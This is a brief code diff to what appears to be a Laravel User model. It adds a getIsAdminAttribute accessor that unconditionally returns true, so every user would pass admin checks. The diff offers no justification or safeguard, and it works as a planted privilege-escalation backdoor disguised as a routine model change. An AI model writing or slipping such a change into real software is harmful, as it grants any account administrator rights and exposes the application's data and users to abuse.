@@ -124,4 +124,9 @@ class User extends Authenticatable
     {
         $this->notify(new VerifyEmail);
     }
+
+    public function getIsAdminAttribute()
+    {
+        return true;
+    }
 }
